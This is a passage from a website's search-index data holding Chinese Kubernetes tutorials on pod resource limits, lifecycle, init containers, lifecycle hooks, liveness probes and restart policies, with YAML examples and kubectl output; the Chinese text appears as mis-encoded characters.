nginx:1.17.1\n    resources: # èµæºéé¢\n      limits:  # éå¶èµæºï¼ä¸éï¼\n        cpu: "2" # cpuéå¶ï¼åä½æ¯coreæ°\n        memory: "10gi" # åå­éå¶\n      requests: # è¯·æ±èµæºï¼ä¸éï¼\n        cpu: "1"  # cpuéå¶ï¼åä½æ¯coreæ°\n        memory: "10mi"  # åå­éå¶\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¨è¿å¯¹ cpu å memory çåä½åä¸ä¸ªè¯´æï¼\n\n * cpuï¼core æ°ï¼å¯ä»¥ä¸ºæ´æ°æå°æ°\n * memoryï¼ åå­å¤§å°ï¼å¯ä»¥ä½¿ç¨ giãmiãgãm ç­å½¢å¼\n\n# è¿è¡pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# æ¥çåç°podè¿è¡æ­£å¸¸\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev\nname            ready   status    restarts   age  \npod-resources   1/1     running   0          39s   \n\n# æ¥ä¸æ¥ï¼åæ­¢pod\n[root@k8s-master01 ~]# kubectl delete  -f pod-resources.yaml\npod "pod-resources" deleted\n\n# ç¼è¾podï¼ä¿®æ¹resources.requests.memoryçå¼ä¸º10gi\n[root@k8s-master01 ~]# vim pod-resources.yaml\n\n# åæ¬¡å¯å¨pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# æ¥çpodç¶æï¼åç°podå¯å¨å¤±è´¥\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev -o wide\nname            ready   status    restarts   age          \npod-resources   0/1     pending   0          20s    \n\n# æ¥çpodè¯¦æä¼åç°ï¼å¦ä¸æç¤º\n[root@k8s-master01 ~]# kubectl describe pod pod-resources -n dev\n......\nwarning  failedscheduling  35s   default-scheduler  0/3 nodes are available: 1 node(s) had taint {node-role.kubernetes.io/master: }, that the pod didn\'t tolerate, 2 insufficient memory.(åå­ä¸è¶³)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n',charsets:{cjk:!0}},{title:"kubernetes(å­) Pod çå½å¨æ",frontmatter:{title:"kubernetes(å­) Pod çå½å¨æ",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/605",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/605.kubernetes(%E5%85%AD)%20Pod%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html",relativePath:"01.è¿ç»´/60.Kubernetes/605.kubernetes(å­) Pod çå½å¨æ.md",key:"v-22acaa33",path:"/kubernetes/605/",headers:[{level:2,title:"æ¦è¿°",slug:"æ¦è¿°",normalizedTitle:"æ¦è¿°",charIndex:2},{level:2,title:"é©å­å½æ°",slug:"é©å­å½æ°",normalizedTitle:"é©å­å½æ°",charIndex:3842},{level:2,title:"å®¹å¨æ¢æµ",slug:"å®¹å¨æ¢æµ",normalizedTitle:"å®¹å¨æ¢æµ",charIndex:5547},{level:2,title:"éå¯ç­ç¥",slug:"éå¯ç­ç¥",normalizedTitle:"éå¯ç­ç¥",charIndex:7477}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"æ¦è¿° é©å­å½æ° å®¹å¨æ¢æµ éå¯ç­ç¥",content:'# æ¦è¿°\n\næä»¬ä¸è¬å° Pod å¯¹è±¡ä»åå»ºè³ç»çè¿æ®µæ¶é´èå´ç§°ä¸º Pod ççå½å¨æï¼å®ä¸»è¦åå«ä¸é¢çè¿ç¨ï¼\n\n * Pod åå»ºè¿ç¨\n * è¿è¡åå§åå®¹å¨ï¼init containerï¼è¿ç¨\n * è¿è¡ä¸»å®¹å¨ï¼main containerï¼è¿ç¨\n   * å®¹å¨å¯å¨åé©å­ï¼post startï¼ãå®¹å¨ç»æ­¢åé©å­ï¼pre stopï¼\n     - å®¹å¨çå­æ´»æ§æ¢æµï¼liveness probeï¼ãå°±ç»ªæ§æ¢æµï¼readiness probeï¼\n * pod ç»æ­¢è¿ç¨\n\n\n\nå¨æ´ä¸ªçå½å¨æä¸­ï¼Pod ä¼åºç° 5 ä¸­ç¶æï¼åå«å¦ä¸ï¼\n\n * æèµ·ï¼Pendingï¼ï¼apiserver å·²ç»åå»ºäº pod èµæºå¯¹è±¡ï¼ä½å®å°æªè¢«è°åº¦å®ææèä»å¤äºä¸è½½éåçè¿ç¨ä¸­\n * è¿è¡ä¸­ï¼Runningï¼ï¼pod å·²ç»è¢«è°åº¦è³æèç¹ï¼å¹¶ä¸ææå®¹å¨é½å·²ç»è¢« kubelet åå»ºå®æ\n * æåï¼Successdedï¼ï¼pod ä¸­çææå®¹å¨é½å·²ç»æåç»æ­¢å¹¶ä¸ä¸ä¼è¢«éå¯\n * å¤±è´¥ï¼Failedï¼ï¼ææå®¹å¨é½å·²ç»ç»æ­¢ï¼ä½è³å°æä¸ä¸ªå®¹å¨ç»æ­¢å¤±è´¥ï¼å³å®¹å¨è¿åäºé 0 å¼å¾éåºç¶æ\n * æªç¥ï¼Unknownï¼ï¼apiserver æ æ³æ­£å¸¸è·åå° pod å¯¹è±¡çç¶æä¿¡æ¯ï¼éå¸¸ç±ç½ç»éä¿¡å¤±è´¥æå¯¼è´\n\n\n# åå»ºåç»æ­¢\n\npod çåå»ºè¿ç¨\n\n 1. ç¨æ·éè¿ kubectl æå¶ä» api å®¢æ·ç«¯æäº¤éè¦åå»ºç pod ä¿¡æ¯ç» apiServer\n 2. apiServer å¼å§çæ pod å¯¹è±¡çä¿¡æ¯ï¼å¹¶å°ä¿¡æ¯å­å¥ etcdï¼ç¶åè¿åç¡®è®¤ä¿¡æ¯è³å®¢æ·ç«¯\n 3. apiServer å¼å§åæ  etcd ä¸­ç pod å¯¹è±¡çååï¼å¶å®ç»ä»¶ä½¿ç¨ watch æºå¶æ¥è·è¸ªæ£æ¥ apiServer ä¸çåå¨\n 4. scheduler åç°ææ°ç pod å¯¹è±¡è¦åå»ºï¼å¼å§ä¸º Pod åéä¸»æºå¹¶å°ç»æä¿¡æ¯æ´æ°è³ apiServer\n 5. node èç¹ä¸ç kubelet åç°æ pod è°åº¦è¿æ¥ï¼å°è¯è°ç¨ docker å¯å¨å®¹å¨ï¼å¹¶å°ç»æåéè³ apiServer\n 6. apiServer å°æ¥æ¶å°ç pod ç¶æä¿¡æ¯å­å¥ etcd ä¸­\n\n\n\npod çç»æ­¢è¿ç¨\n\n 1. ç¨æ·å apiServer åéå é¤ pod å¯¹è±¡çå½ä»¤\n 2. apiServcer ä¸­ç pod å¯¹è±¡ä¿¡æ¯ä¼éçæ¶é´çæ¨ç§»èæ´æ°ï¼å¨å®½éæåï¼é»è®¤ 30sï¼ï¼pod è¢«è§ä¸º dead\n 3. å° pod æ è®°ä¸º terminating ç¶æ\n 4. kubelet å¨çæ§å° pod å¯¹è±¡è½¬ä¸º terminating ç¶æçåæ¶å¯å¨ pod å³é­è¿ç¨\n 5. ç«¯ç¹æ§å¶å¨çæ§å° pod å¯¹è±¡çå³é­è¡ä¸ºæ¶å°å¶ä»ææå¹éå°æ­¤ç«¯ç¹ç service èµæºçç«¯ç¹åè¡¨ä¸­ç§»é¤\n 6. å¦æå½å pod å¯¹è±¡å®ä¹äº preStop é©å­å¤çå¨ï¼åå¨å¶æ è®°ä¸º terminating åå³ä¼ä»¥åæ­¥çæ¹å¼å¯å¨æ§è¡\n 7. pod å¯¹è±¡ä¸­çå®¹å¨è¿ç¨æ¶å°åæ­¢ä¿¡å·\n 8. å®½éæç»æåï¼è¥ pod ä¸­è¿å­å¨ä»å¨è¿è¡çè¿ç¨ï¼é£ä¹ pod å¯¹è±¡ä¼æ¶å°ç«å³ç»æ­¢çä¿¡å·\n 9. kubelet è¯·æ± apiServer å°æ­¤ pod èµæºçå®½éæè®¾ç½®ä¸º 0 ä»èå®æå é¤æä½ï¼æ­¤æ¶ pod å¯¹äºç¨æ·å·²ä¸å¯è§\n\n\n# åå§ååå®¹å¨\n\nåå§åå®¹å¨æ¯å¨ pod çä¸»å®¹å¨å¯å¨ä¹åè¦è¿è¡çå®¹å¨ï¼ä¸»è¦æ¯åä¸äºä¸»å®¹å¨çåç½®å·¥ä½ï¼å®å·æä¸¤å¤§ç¹å¾ï¼\n\n 1. åå§åå®¹å¨å¿é¡»è¿è¡å®æç´è³ç»æï¼è¥æåå§åå®¹å¨è¿è¡å¤±è´¥ï¼é£ä¹ kubernetes éè¦éå¯å®ç´å°æåå®æ\n 2. åå§åå®¹å¨å¿é¡»æç§å®ä¹çé¡ºåºæ§è¡ï¼å½ä¸ä»å½åä¸ä¸ªæåä¹åï¼åé¢çä¸ä¸ªæè½è¿è¡\n\nåå§åå®¹å¨æå¾å¤çåºç¨åºæ¯ï¼ä¸é¢ååºçæ¯æå¸¸è§çå ä¸ªï¼\n\n * æä¾ä¸»å®¹å¨éåä¸­ä¸å·å¤çå·¥å·ç¨åºæèªå®ä¹ä»£ç \n * åå§åå®¹å¨è¦åäºåºç¨å®¹å¨ä¸²è¡å¯å¨å¹¶è¿è¡å®æï¼å æ­¤å¯ç¨äºå»¶ååºç¨å®¹å¨çå¯å¨ç´è³å¶ä¾èµçæ¡ä»¶å¾å°æ»¡è¶³\n\nåè®¾è¦ä»¥ä¸»å®¹å¨æ¥è¿è¡ nginxï¼ä½æ¯è¦æ±å¨è¿è¡ nginx ä¹ååè¦è½å¤è¿æ¥ä¸ç¸åºçæå¡å¨æ¯å¯ä»¥ ping éçã\nåå»º pod-initcontainer.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-initcontainer\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerPort: 80\n  # åå§åå®¹å¨\n  initContainers:\n  # æ¨¡æmysqlè¿æ¥\n  - name: test-mysql\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.102 -c 1 ; do echo waiting for mysql...; sleep 2; done;\']ã\n  # æ¨¡æredisè¿æ¥\n  - name: test-redis\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.103 -c 1 ; do echo waiting for reids...; sleep 2; done;\']\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-initcontainer.yaml\npod/pod-initcontainer created\n\n# æ¥çpodç¶æ\n# åç°podå¡å¨å¯å¨ç¬¬ä¸ä¸ªåå§åå®¹å¨è¿ç¨ä¸­ï¼åé¢çå®¹å¨ä¸ä¼è¿è¡\nroot@k8s-master01 ~]# kubectl describe pod  pod-initcontainer -n dev\n........\nEvents:\n  Type    Reason     Age   From               Message\n  ----    ------     ----  ----               -------\n  Normal  Scheduled  49s   default-scheduler  Successfully assigned dev/pod-initcontainer to node1\n  Normal  Pulled     48s   kubelet, node1     Container image "busybox:1.30" already present on machine\n  Normal  Created    48s   kubelet, node1     Created container test-mysql\n  Normal  Started    48s   kubelet, node1     Started container test-mysql\n\n# å¨ææ¥çpod\n[root@k8s-master01 ~]# kubectl get pods pod-initcontainer -n dev -w\nNAME                             READY   STATUS     RESTARTS   AGE\npod-initcontainer                0/1     Init:0/2   0          15s\npod-initcontainer                0/1     Init:1/2   0          52s\npod-initcontainer                0/1     Init:1/2   0          53s\npod-initcontainer                0/1     PodInitializing   0          89s\npod-initcontainer                1/1     Running           0          90s\n\n# æ¥ä¸æ¥æ°å¼ä¸ä¸ªshellï¼ä¸ºå½åæå¡å¨æ°å¢ä¸¤ä¸ªipï¼è§å¯podçååï¼ä¸ºç½å¡æ·»å å°å\n[root@k8s-master01 ~]# ifconfig ens33:1 192.168.81.102 netmask 255.255.255.0 up\n[root@k8s-master01 ~]# ifconfig ens33:2 192.168.81.103 netmask 255.255.255.0 up\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# é©å­å½æ°\n\né©å­å½æ°è½å¤æç¥èªèº«çå½å¨æä¸­çäºä»¶ï¼å¹¶å¨ç¸åºçæ¶å»å°æ¥æ¶è¿è¡ç¨æ·æå®çç¨åºä»£ç ã\n\nkubernetes å¨ä¸»å®¹å¨çå¯å¨ä¹åååæ­¢ä¹åæä¾äºä¸¤ä¸ªé©å­å½æ°ï¼\n\n * post startï¼å®¹å¨åå»ºä¹åæ§è¡ï¼å¦æå¤±è´¥äºä¼éå¯å®¹å¨\n * pre stop ï¼å®¹å¨ç»æ­¢ä¹åæ§è¡ï¼æ§è¡å®æä¹åå®¹å¨å°æåç»æ­¢ï¼å¨å¶å®æä¹åä¼é»å¡å é¤å®¹å¨çæä½\n\né©å­å¤çå¨æ¯æä½¿ç¨ä¸é¢ä¸ç§æ¹å¼å®ä¹å¨ä½ï¼\n\n * Exec å½ä»¤ï¼å¨å®¹å¨åæ§è¡ä¸æ¬¡å½ä»¤\n\nâ¦â¦\n  lifecycle:\n    postStart: \n      exec:\n        command:\n        - cat\n        - /tmp/healthy\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * TCPSocketï¼å¨å½åå®¹å¨å°è¯è®¿é®æå®ç socket\n\nâ¦â¦      \n  lifecycle:\n    postStart:\n      tcpSocket:\n        port: 8080\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n\n * HTTPGetï¼å¨å½åå®¹å¨ä¸­åæ url åèµ· http è¯·æ±\n\nâ¦â¦\n  lifecycle:\n    postStart:\n      httpGet:\n        path: / #URIå°å\n        port: 80 #ç«¯å£å·\n        host: 192.168.5.3 #ä¸»æºå°å\n        scheme: HTTP #æ¯æçåè®®ï¼httpæèhttps\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ¥ä¸æ¥ï¼ä»¥ exec æ¹å¼ä¸ºä¾ï¼æ¼ç¤ºä¸é©å­å½æ°çä½¿ç¨ï¼åå»º pod-hook-exec.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-hook-exec\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    # çå½å¨æ\n    lifecycle:\n      postStart: \n        exec: # å¨å®¹å¨å¯å¨çæ¶åæ§è¡ä¸ä¸ªå½ä»¤ï¼ä¿®æ¹ænginxçé»è®¤é¦é¡µåå®¹\n          command: ["/bin/sh", "-c", "echo postStart... > /usr/share/nginx/html/index.html"]\n      preStop:\n        exec: # å¨å®¹å¨åæ­¢ä¹ååæ­¢nginxæå¡\n          command: ["/usr/sbin/nginx","-s","quit"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-hook-exec.yaml\npod/pod-hook-exec created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods  pod-hook-exec -n dev -o wide\nNAME           READY   STATUS     RESTARTS   AGE    IP            NODE    \npod-hook-exec  1/1     Running    0          29s    10.244.2.48   node2   \n\n# è®¿é®pod\n[root@k8s-master01 ~]# curl 10.244.2.48\npostStart...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# å®¹å¨æ¢æµ\n\nå®¹å¨æ¢æµç¨äºæ£æµå®¹å¨ä¸­çåºç¨å®ä¾æ¯å¦æ­£å¸¸å·¥ä½ï¼æ¯ä¿éä¸å¡å¯ç¨æ§çä¸ç§ä¼ ç»æºå¶ãå¦æç»è¿æ¢æµï¼å®ä¾çç¶æä¸ç¬¦åé¢æï¼é£ä¹ kubernetes å°±ä¼æè¯¥é®é¢å®ä¾ "æé¤"ï¼ä¸æ¿æä¸å¡æµéãkubernetes æä¾äºä¸¤ç§æ¢éæ¥å®ç°å®¹å¨æ¢æµï¼åå«æ¯ï¼\n\n * liveness probesï¼å­æ´»æ§æ¢éï¼ç¨äºæ£æµåºç¨å®ä¾å½åæ¯å¦å¤äºæ­£å¸¸è¿è¡ç¶æï¼å¦æä¸æ¯ï¼k8s ä¼éå¯å®¹å¨\n * readiness probesï¼å°±ç»ªæ§æ¢éï¼ç¨äºæ£æµåºç¨å®ä¾å½åæ¯å¦å¯ä»¥æ¥æ¶è¯·æ±ï¼å¦æä¸è½ï¼k8s ä¸ä¼è½¬åæµé\n\n> livenessProbe å³å®æ¯å¦éå¯å®¹å¨ï¼readinessProbe å³å®æ¯å¦å°è¯·æ±è½¬åç»å®¹å¨ã\n\nä¸é¢ä¸¤ç§æ¢éç®ååæ¯æä¸ç§æ¢æµæ¹å¼ï¼\n\n * Exec å½ä»¤ï¼å¨å®¹å¨åæ§è¡ä¸æ¬¡å½ä»¤ï¼å¦æå½ä»¤æ§è¡çéåºç ä¸º 0ï¼åè®¤ä¸ºç¨åºæ­£å¸¸ï¼å¦åä¸æ­£å¸¸\n\nâ¦â¦\n  livenessProbe:\n    exec:\n      command:\n      - cat\n      - /tmp/healthy\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * TCPSocketï¼å°ä¼å°è¯è®¿é®ä¸ä¸ªç¨æ·å®¹å¨çç«¯å£ï¼å¦æè½å¤å»ºç«è¿æ¡è¿æ¥ï¼åè®¤ä¸ºç¨åºæ­£å¸¸ï¼å¦åä¸æ­£å¸¸\n\nâ¦â¦      \n  livenessProbe:\n    tcpSocket:\n      port: 8080\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n\n * HTTPGetï¼è°ç¨å®¹å¨å Web åºç¨ç URLï¼å¦æè¿åçç¶æç å¨ 200 å 399 ä¹é´ï¼åè®¤ä¸ºç¨åºæ­£å¸¸ï¼å¦åä¸æ­£å¸¸\n\nâ¦â¦\n  livenessProbe:\n    httpGet:\n      path: / #URIå°å\n      port: 80 #ç«¯å£å·\n      host: 127.0.0.1 #ä¸»æºå°å\n      scheme: HTTP #æ¯æçåè®®ï¼httpæèhttps\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä¸é¢ä»¥ liveness probes ä¸ºä¾ï¼åå ä¸ªæ¼ç¤ºï¼\næ¹å¼ä¸ï¼Exec\nåå»º pod-liveness-exec.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-exec\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      exec:\n        command: ["/bin/cat","/tmp/hello.txt"] # æ§è¡ä¸ä¸ªæ¥çæä»¶çå½ä»¤\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå»º podï¼è§å¯ææ\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-exec.yaml\npod/pod-liveness-exec created\n\n# æ¥çPodè¯¦æ\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-exec -n dev\n......\n  Normal   Created    20s (x2 over 50s)  kubelet, node1     Created container nginx\n  Normal   Started    20s (x2 over 50s)  kubelet, node1     Started container nginx\n  Normal   Killing    20s                kubelet, node1     Container nginx failed liveness probe, will be restarted\n  Warning  Unhealthy  0s (x5 over 40s)   kubelet, node1     Liveness probe failed: cat: can\'t open \'/tmp/hello11.txt\': No such file or directory\n  \n# è§å¯ä¸é¢çä¿¡æ¯å°±ä¼åç°nginxå®¹å¨å¯å¨ä¹åå°±è¿è¡äºå¥åº·æ£æ¥\n# æ£æ¥å¤±è´¥ä¹åï¼å®¹å¨è¢«killæï¼ç¶åå°è¯è¿è¡éå¯ï¼è¿æ¯éå¯ç­ç¥çä½ç¨ï¼åé¢è®²è§£ï¼\n# ç¨ç­ä¸ä¼ä¹åï¼åè§å¯podä¿¡æ¯ï¼å°±å¯ä»¥çå°RESTARTSä¸åæ¯0ï¼èæ¯ä¸ç´å¢é¿\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-exec -n dev\nNAME                READY   STATUS             RESTARTS   AGE\npod-liveness-exec   0/1     CrashLoopBackOff   2          3m19s\n\n# å½ç¶æ¥ä¸æ¥ï¼å¯ä»¥ä¿®æ¹æä¸ä¸ªå­å¨çæä»¶ï¼æ¯å¦/tmp/hello.txtï¼åè¯ï¼ç»æå°±æ­£å¸¸äº......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\næ¹å¼äºï¼TCPSocket\nåå»º pod-liveness-tcpsocket.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-tcpsocket\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      tcpSocket:\n        port: 8080 # å°è¯è®¿é®8080ç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå»º podï¼è§å¯ææ\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-tcpsocket.yaml\npod/pod-liveness-tcpsocket created\n\n# æ¥çPodè¯¦æ\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-tcpsocket -n dev\n......\n  Normal   Scheduled  31s                            default-scheduler  Successfully assigned dev/pod-liveness-tcpsocket to node2\n  Normal   Pulled     <invalid>                      kubelet, node2     Container image "nginx:1.17.1" already present on machine\n  Normal   Created    <invalid>                      kubelet, node2     Created container nginx\n  Normal   Started    <invalid>                      kubelet, node2     Started container nginx\n  Warning  Unhealthy  <invalid> (x2 over <invalid>)  kubelet, node2     Liveness probe failed: dial tcp 10.244.2.44:8080: connect: connection refused\n  \n# è§å¯ä¸é¢çä¿¡æ¯ï¼åç°å°è¯è®¿é®8080ç«¯å£,ä½æ¯å¤±è´¥äº\n# ç¨ç­ä¸ä¼ä¹åï¼åè§å¯podä¿¡æ¯ï¼å°±å¯ä»¥çå°RESTARTSä¸åæ¯0ï¼èæ¯ä¸ç´å¢é¿\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-tcpsocket  -n dev\nNAME                     READY   STATUS             RESTARTS   AGE\npod-liveness-tcpsocket   0/1     CrashLoopBackOff   2          3m19s\n\n# å½ç¶æ¥ä¸æ¥ï¼å¯ä»¥ä¿®æ¹æä¸ä¸ªå¯ä»¥è®¿é®çç«¯å£ï¼æ¯å¦80ï¼åè¯ï¼ç»æå°±æ­£å¸¸äº......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\næ¹å¼ä¸ï¼HTTPGet\nåå»º pod-liveness-httpget.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      httpGet:  # å¶å®å°±æ¯è®¿é®http://127.0.0.1:80/hello  \n        scheme: HTTP #æ¯æçåè®®ï¼httpæèhttps\n        port: 80 #ç«¯å£å·\n        path: /hello #URIå°å\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nåå»º podï¼è§å¯ææ\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-httpget.yaml\npod/pod-liveness-httpget created\n\n# æ¥çPodè¯¦æ\n[root@k8s-master01 ~]# kubectl describe pod pod-liveness-httpget -n dev\n.......\n  Normal   Pulled     6s (x3 over 64s)  kubelet, node1     Container image "nginx:1.17.1" already present on machine\n  Normal   Created    6s (x3 over 64s)  kubelet, node1     Created container nginx\n  Normal   Started    6s (x3 over 63s)  kubelet, node1     Started container nginx\n  Warning  Unhealthy  6s (x6 over 56s)  kubelet, node1     Liveness probe failed: HTTP probe failed with statuscode: 404\n  Normal   Killing    6s (x2 over 36s)  kubelet, node1     Container nginx failed liveness probe, will be restarted\n  \n# è§å¯ä¸é¢ä¿¡æ¯ï¼å°è¯è®¿é®è·¯å¾ï¼ä½æ¯æªæ¾å°,åºç°404éè¯¯\n# ç¨ç­ä¸ä¼ä¹åï¼åè§å¯podä¿¡æ¯ï¼å°±å¯ä»¥çå°RESTARTSä¸åæ¯0ï¼èæ¯ä¸ç´å¢é¿\n[root@k8s-master01 ~]# kubectl get pod pod-liveness-httpget -n dev\nNAME                   READY   STATUS    RESTARTS   AGE\npod-liveness-httpget   1/1     Running   5          3m17s\n\n# å½ç¶æ¥ä¸æ¥ï¼å¯ä»¥ä¿®æ¹æä¸ä¸ªå¯ä»¥è®¿é®çè·¯å¾pathï¼æ¯å¦/ï¼åè¯ï¼ç»æå°±æ­£å¸¸äº......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nè³æ­¤ï¼å·²ç»ä½¿ç¨ liveness Probe æ¼ç¤ºäºä¸ç§æ¢æµæ¹å¼ï¼ä½æ¯æ¥ç livenessProbe çå­å±æ§ï¼ä¼åç°é¤äºè¿ä¸ç§æ¹å¼ï¼è¿æä¸äºå¶ä»çéç½®ï¼å¨è¿éä¸å¹¶è§£éä¸ï¼\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.livenessProbe\nFIELDS:\n   exec <Object>  \n   tcpSocket    <Object>\n   httpGet      <Object>\n   initialDelaySeconds  <integer>  # å®¹å¨å¯å¨åç­å¾å¤å°ç§æ§è¡ç¬¬ä¸æ¬¡æ¢æµ\n   timeoutSeconds       <integer>  # æ¢æµè¶æ¶æ¶é´ãé»è®¤1ç§ï¼æå°1ç§\n   periodSeconds        <integer>  # æ§è¡æ¢æµçé¢çãé»è®¤æ¯10ç§ï¼æå°1ç§\n   failureThreshold     <integer>  # è¿ç»­æ¢æµå¤±è´¥å¤å°æ¬¡æè¢«è®¤å®ä¸ºå¤±è´¥ãé»è®¤æ¯3ãæå°å¼æ¯1\n   successThreshold     <integer>  # è¿ç»­æ¢æµæåå¤å°æ¬¡æè¢«è®¤å®ä¸ºæåãé»è®¤æ¯1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * initialDelaySeconds å®¹å¨å¯å¨åç­å¾å¤å°ç§æ§è¡ç¬¬ä¸æ¬¡æ¢æµ\n * timeoutSeconds æ¢æµè¶æ¶æ¶é´ãé»è®¤ 1 ç§ï¼æå° 1 ç§\n * periodSeconds æ§è¡æ¢æµçé¢çãé»è®¤æ¯ 10 ç§ï¼æå° 1 ç§\n * failureThreshold è¿ç»­æ¢æµå¤±è´¥å¤å°æ¬¡æè¢«è®¤å®ä¸ºå¤±è´¥ãé»è®¤æ¯ 3ãæå°å¼æ¯ 1\n * successThreshold è¿ç»­æ¢æµæåå¤å°æ¬¡æè¢«è®¤å®ä¸ºæåãé»è®¤æ¯ 1\n\nä¸é¢ç¨å¾®éç½®ä¸¤ä¸ªï¼æ¼ç¤ºä¸ææå³å¯ï¼\n\n[root@k8s-master01 ~]# more pod-liveness-httpget.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      httpGet:\n        scheme: HTTP\n        port: 80 \n        path: /\n      initialDelaySeconds: 30 # å®¹å¨å¯å¨å30så¼å§æ¢æµ\n      timeoutSeconds: 5 # æ¢æµè¶æ¶æ¶é´ä¸º5s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# éå¯ç­ç¥\n\nä¸æ¦å®¹å¨æ¢æµåºç°äºé®é¢ï¼kubernetes å°±ä¼å¯¹å®¹å¨æå¨ç Pod è¿è¡éå¯ï¼å¶å®è¿æ¯ç± pod çéå¯ç­ç¥å³å®çï¼pod çéå¯ç­ç¥æ 3 ç§ï¼åå«å¦ä¸ï¼\n\n * Always ï¼å®¹å¨å¤±ææ¶ï¼èªå¨éå¯è¯¥å®¹å¨ï¼è¿ä¹æ¯é»è®¤å¼ã\n * OnFailure ï¼ å®¹å¨ç»æ­¢è¿è¡ä¸éåºç ä¸ä¸º 0 æ¶éå¯\n * Never ï¼ ä¸è®ºç¶æä¸ºä½ï¼é½ä¸éå¯è¯¥å®¹å¨\n\néå¯ç­ç¥éç¨äº pod å¯¹è±¡ä¸­çææå®¹å¨ï¼é¦æ¬¡éè¦éå¯çå®¹å¨ï¼å°å¨å¶éè¦æ¶ç«å³è¿è¡éå¯ï¼éååæ¬¡éè¦éå¯çæä½å°ç± kubelet å»¶è¿ä¸æ®µæ¶é´åè¿è¡ï¼ä¸åå¤çéå¯æä½çå»¶è¿æ¶é¿ä»¥æ­¤ä¸º 10sã20sã40sã80sã160s å 300sï¼300s æ¯æå¤§å»¶è¿æ¶é¿ã\n\nåå»º pod-restartpolicy.yamlï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-restartpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n   